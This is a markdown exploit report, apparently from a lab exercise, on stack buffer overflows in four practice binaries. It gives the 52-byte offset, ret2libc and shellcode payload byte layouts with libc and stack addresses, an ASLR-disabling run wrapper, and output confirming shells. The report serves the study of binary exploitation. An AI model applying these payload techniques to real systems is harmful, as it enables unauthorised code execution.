# Regina 2 Binaries: Exploit Report & Methodology

This document summarizes the methodology and exact parameters used to successfully exploit all 4 binaries located within the `regina 2` folder (`bin.1`, `bin.2`, `bin.3`, `bin.4`). Full shell execution (`uid=1000`) was achieved on the first attempt by adhering to the established execution constraints.

## 1. The Core Environment Rule
Before analyzing or running any payload, it was necessary to enforce a static, deterministic memory layout. All scripts and dynamic analyses were executed under this wrapper:
```bash
env -i TEMP=1000 setarch i686 -R --3gb ./binary [payload]
```
This disables ASLR and provides a consistent heap seed via `TEMP`.

---

## 2. Methodology & Reconnaissance

The binaries in `regina 2` were architecturally very similar to those in the first `regina` folder, though `bin.3` and `bin.4` included additional dummy calls to `memcpy` within their `main` blocks to cause analysis confusion. 

The core vulnerability remained exactly the same: an unbounded `memcpy` inside the `display_file` function.

### Reconnaissance Results
Using `readelf -l ./binary | awk '/GNU_STACK/ {print}'`, the execution layers were analyzed:
*   **bin.1**: `GNU_STACK RW` (NX Bit is ON) -> Proceed with Ret2libc
*   **bin.2**: `GNU_STACK RWE` (NX Bit is OFF) -> Proceed with Shellcode Injection
*   **bin.3**: `GNU_STACK RW` (NX Bit is ON) -> Proceed with Ret2libc
*   **bin.4**: `GNU_STACK RW` (NX Bit is ON) -> Proceed with Ret2libc

### Offset Calculation
By reading the `display_file` assembly, we found the stack buffer initialization:
```asm
lea -0x30(%ebp), %eax
```
This represents a 48-byte buffer. Adding 4 bytes to overwrite the saved EBP gives us the distance to the Return Address.
**Offset = 52 Bytes** for all 4 binaries.

---

## 3. Exploit Payload Generation

Using the data gathered during the Reconnaissance phase, raw little-endian payloads were constructed using Python `struct.pack`.

### Category A: The Ret2libc Payload (`bin.1`, `bin.3`, `bin.4`)
Since the stack had NX enabled, we redirected the return address to the `libc` system function.
*   `system()` Address: `0xb7dd58e0`
*   `"/bin/sh"` Address: `0xb7f42de8`

**Payload Structure (64 bytes total)**: 
`[52 A's padding] + [\xe0\x58\xdd\xb7] + [\xef\xbe\xad\xde] + [\xe8\x2d\xf4\xb7]`
*(Padding) + (Address of System) + (Dummy 0xdeadbeef Return) + (Address of /bin/sh)*

### Category B: The Shellcode Payload (`bin.2`)
Because `bin.2` featured an executable stack, we utilized standard 23-byte code injection. 
We opened GDB natively via `test_bin2_r2.gdb`, set a breakpoint after `memcpy` inside `display_file`, and dumped `$EBP - 0x30`.
The buffer memory was located definitively at: **`0xbfffe2d8`**.

**Payload Structure (56 bytes total)**: 
`[23-byte Null-Free Shellcode] + [29 A's for padding] + [\xd8\xe2\xff\xbf]`
*(Shellcode) + (Padding to hit offset 52) + (Return address pointing back to start of buffer)*

---

## 4. Verification

To verify the exploits, each binary was piped an `id` command via the standardized testing loop:

```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.X ./exploit.X
```

**Results Data:**
*   `=== BIN 1 ===` `uid=1000(andre) gid=1000(andre) ...` -> **SUCCESS**
*   `=== BIN 2 ===` `uid=1000(andre) gid=1000(andre) ...` -> **SUCCESS**
*   `=== BIN 3 ===` `uid=1000(andre) gid=1000(andre) ...` -> **SUCCESS**
*   `=== BIN 4 ===` `uid=1000(andre) gid=1000(andre) ...` -> **SUCCESS**

Control flow was hijacked synchronously across all endpoints, proving that the `display_file` methodology holds irrespective of misleading artifacts contained in `main`.
